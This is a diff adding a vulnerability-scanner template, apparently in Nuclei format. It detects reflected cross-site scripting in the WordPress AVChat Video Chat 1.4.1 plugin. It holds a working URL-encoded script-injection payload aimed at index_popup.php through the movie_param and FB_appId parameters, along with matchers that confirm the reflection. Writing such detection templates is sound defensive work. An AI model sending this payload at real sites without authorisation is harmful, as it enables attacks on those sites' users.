@@ -1,0 +1,28 @@
+id: avchat-video-chat-xss
+name: WordPress AVChat Video Chat 1.4.1 - Cross-Site Scripting
+severity: medium
+confidence: confirmed
+description: WordPress AVChat Video Chat 1.4.1 is vulnerable to reflected cross-site scripting via index_popup.php and multiple
+  parameters.
+reference: CWE-80
+tags:
+- xss
+- wp
+- wpscan
+- wordpress
+- wp-plugin
+- vuln
+requests:
+- method: GET
+  path: /wp-content/plugins/avchat-3/index_popup.php?movie_param=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&FB_appId=FB_appId%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&
+  matchers:
+  - type: body
+    words:
+    - value="FB_appId"><script>alert(document.domain)</script>"
+  - type: header
+    words:
+    - text/html
+  - type: status
+    status:
+    - 200
+  condition: and
